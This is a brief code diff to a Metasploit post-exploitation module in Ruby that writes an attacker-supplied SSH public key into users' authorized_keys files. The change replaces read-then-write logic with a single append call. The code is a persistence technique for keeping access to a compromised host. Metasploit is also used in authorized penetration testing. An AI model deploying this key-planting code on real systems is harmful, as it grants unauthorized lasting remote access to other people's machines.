@@ -119,15 +119,8 @@ class MetasploitModule < Msf::Post
     paths.each do |path|
       path.chomp!
       authorized_keys = "#{path}/#{auth_key_file}"
-      if file?(authorized_keys)
-        print_status("Adding key to #{authorized_keys}")
-        data = read_file(authorized_keys)
-        data << "\n#{our_pub_key}"
-      else
-        print_status("Creating #{authorized_keys}")
-        data = our_pub_key
-      end
-      write_file(authorized_keys, data)
+      print_status("Adding key to #{authorized_keys}")
+      append_file(authorized_keys, "\n#{our_pub_key}")
       print_good("Key Added")
       if datastore['PubKey'].nil?
         path_array = path.split(sep)
